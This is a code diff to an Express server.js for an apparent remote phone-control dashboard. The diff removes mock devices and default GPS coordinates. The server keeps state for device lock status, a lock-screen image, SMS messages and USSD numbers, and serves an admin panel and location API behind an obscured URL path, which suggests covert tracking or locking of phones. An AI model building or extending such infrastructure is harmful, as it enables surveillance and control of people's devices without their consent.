@@ -1,4 +1,4 @@
-// server.js – FIXED (properly serves HTML)
+// server.js – DEVICE-CENTRIC DASHBOARD (No default devices)
 const express = require('express');
 const crypto = require('crypto');
 const path = require('path');
@@ -19,58 +19,14 @@ function getClientIP(req) {
     return req.socket.remoteAddress || req.connection.remoteAddress;
 }
 
-// ============================================================
-// MIDDLEWARE
-// ============================================================
 app.use(express.static('public'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-// DEVICE STATE
+// DEVICE STATE (EMPTY - No default devices)
 // ============================================================
-let devices = {
-    'device1': { 
-        name: 'Samsung S23', 
-        locked: false, 
-        battery: 85, 
-        online: true,
-        model: 'Samsung Galaxy S23',
-        manufacturer: 'Samsung',
-        android_version: '14.0',
-        storage: '128GB / 89GB used',
-        lat: -1.9441,
-        lng: 30.0619,
-        accuracy: 15
-    },
-    'device2': { 
-        name: 'iPhone 15', 
-        locked: false, 
-        battery: 92, 
-        online: true,
-        model: 'iPhone 15 Pro',
-        manufacturer: 'Apple',
-        android_version: '17.0',
-        storage: '256GB / 120GB used',
-        lat: -1.9480,
-        lng: 30.0580,
-        accuracy: 10
-    },
-    'device3': { 
-        name: 'Pixel 8', 
-        locked: true, 
-        battery: 67, 
-        online: false,
-        model: 'Google Pixel 8',
-        manufacturer: 'Google',
-        android_version: '14.0',
-        storage: '128GB / 95GB used',
-        lat: -1.9520,
-        lng: 30.0620,
-        accuracy: 20
-    }
-};
-
+let devices = {};  // EMPTY - no default devices
 let lockScreenImage = null;
 let smsMessages = [];
 let ussdNumbers = [];
@@ -280,10 +236,9 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD - SERVES HTML PROPERLY
+// ADMIN DASHBOARD
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
-    // Read and send the HTML file with proper content type
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
@@ -369,9 +324,9 @@ app.get('/a9f3k217/api/location/:deviceId', (req, res) => {
     }
     const device = devices[deviceId];
     res.json({
-        lat: device.lat || -1.9441,
-        lng: device.lng || 30.0619,
-        accuracy: device.accuracy || 15,
+        lat: device.lat || null,
+        lng: device.lng || null,
+        accuracy: device.accuracy || null,
         time: new Date().toLocaleString()
     });
 });
